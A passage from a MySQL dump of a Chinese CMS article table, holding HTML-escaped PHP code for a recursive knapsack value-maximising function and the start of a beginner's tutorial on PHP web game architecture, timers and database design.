style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$maxwgt=0;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$maxval=0;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$maxuserwp=array();&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$wp = array_shift($arywp);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$num= floor(($bbw-$use_w)/$wp[1]); //最大单位物品的最大允许个数&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n//echo ” countmax : $num * “.$wp[0].”&amp;lt;br/&amp;gt;\\n”;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif(count($arywp)==0 || $bbw-$use_w==$wp[1]*$num){ //没有剩余物品或刚好填满 //递归结束条件&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif($num&amp;gt;0){&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$maxwgt+=$wp[1]*$num;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$maxval+=$wp[2]*$num;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$maxuserwp[$wp[0]]=$num;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n} else {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nfor($i=0;$i&amp;lt;=$num;$i++){ //计算最大单位物品不同数量时的最大价值&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$use_w=$wp[1]*$i;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$use_v=$wp[2]*$i;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$ary_userwp[$wp[0]]=$i;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif(($num-$i)*$wp[2]/($bbw-$use_w) &amp;lt; $arywp[0][3]){ //剩余空间的单位价值小于下件物品的单位价值&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nlist($subuse_w,$subuse_v,$subusewp)=getmaxval($bbw-$use_w,$arywp);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n} else {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$subuse_w=0;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$subuse_v=0;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$subusewp=array();&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif($use_v+$subuse_v&amp;gt;$maxval || $maxval==0){ //比较最大价值&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$maxwgt=$use_w+$subuse_w;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$maxval=$use_v+$subuse_v;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif($i&amp;gt;0){&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$maxuserwp=array_merge($ary_userwp,$subusewp);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n} else{&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$maxuserwp=$subusewp;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n//print_r($maxuserwp);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n//echo ” maxwgt : $maxwgt maxval : $maxval&amp;lt;br/&amp;gt;\\n”;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n//返回 使用的重量，最大价值、使用的物品数量数组&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nreturn array($maxwgt,$maxval, $maxuserwp);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n//开始计算&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$arysulte= getmaxval($bbw,$arywp);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n//输出结果&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\necho ” bbw “.$bbw.” “;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nprint_r($arysulte);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$time_end = microtime_float();&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$runtime = $time_end – $time_start;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\necho ” runtime : “.$runtime;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n?&amp;gt;&amp;nbsp;&lt;/span&gt;', 1, 1, 0, 0, 1302531470, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(48, 1, 'php网页游戏开发入门教程一（webgame+design）', '', '', '&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;b&gt;&lt;span style=&quot;font-size:14.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;一、简单的程序框架。&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\nwebgame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;程序构成：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;三大部分。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;第一是数据流程。第二是程序。第三是美术。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;其中，数据流程包括了功能。也只有在功能中才能体现数据流程。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;数据流程相当的麻烦，后面再讨论。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;比如最简单的卖买产品。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;要实现这个功能。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;那么需要有产品基础表、产品详细表、商店表、背包表。如果扩展性更强，相应的双表是少不不了的。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;表的问题都简单了。关键是这个物品有什么用。这样物品的来源，一大堆数据，物品的走向，又是一大堆数据。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;最后，这些数据得绕成一个圈。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;绕圈是一件困难的事情。特别是功能和道具多了起来的时候。难度是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;2&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;次方。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;在绕圈之前，如果你比较熟练设计模式。那么这个过程可以简化。难度由&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;2&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;次方变为&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;只需要有控制器、事件工厂、抽象道具工厂这三个虚类；再加上定时器，任务编辑器，这两个通用类。即可以构建一个健壮、高扩展的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;webgame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;在&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;webgame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;里控制器几乎可以等同于页面。随便采用一种模板技术即能很方便的处理。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;事件工厂是一个抽象类，所有的事件，如打工、战斗、移动等都由事件工厂的生产。并且接口相同，方便控制器控制。工厂模式。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;抽象道具工厂是一个抽象类，所有的道具，如城市、地图、装备等，都由抽象道具工厂生产。并且接口相同&lt;/span&gt;&lt;span style=&quot;font-size:10.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;，&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;工厂模式&lt;/span&gt;&lt;span style=&quot;font-size:10.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;，&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;事件与道具的结合又是一个桥接模式。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;美术：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\nUI&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;。简洁漂亮的界面总会有好处。小图标。道具，地图，装备。一类至少&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;10&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;个吧？大体上百把个是需要的。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;程序分&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;5&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;个部分：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;服务器定时器。（&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;C&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;语言或自己设定服务器）定时循环执行某一段代码。而这段代码主要是根据数据库的数据进行更新。这个可以找个&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;C&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;语言程序员来做。对于&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;C&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;语言程序员来讲，这个功能是相当的简单。当然，具体的处理数据的判断和操作数据库，需要你自己写。让&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;C&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;语言程序员给你段标准代码就行了。完全支持&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;sql&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;语句的。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;php&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;的话，可以配置&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;corn&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;实现。但是不管是什么操作系统，配置的时间最低是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;分钟。所以，如果你要处理&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;秒钟刷新一次的情况。你还需要专门的定时器程序来处理，或者被定时执行的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;php&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;需要包含&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;sleep().&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;当然，即使有即时交互，可以不管服务器端。只处理交互的双方的客户端。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;js&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;和&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;ajax&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;实现。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;功能页面、功能函数。主要就是数据存取，判断，数据走向。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;用上抽象类，会比较轻松。不过子类的爆炸是少不了的了。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\najax&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;函数。（可选）某些需要伪即时的功能要用到。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;为了让游戏看起来酷一点。用吧。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\njavascript&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;函数。（可选）模拟客户端的数据计算。也就是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;webgame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;的与时间相关的数据。分为两部分。一部分是真实数据，是由服务器端的定时器计算的。另一部分是只有初始值，客户端显示用的。不需要即时同步，仅仅需要模拟同步就行。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;这里还包括一些漂亮的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;UI&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;特效。毕竟是游戏。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;数据库。一大堆基础数据表和详细数据表。基础数据表：比如等级&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;到等级&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;100&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;的用户的属性初始值。详细数据表：每个用户的具体属性。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span 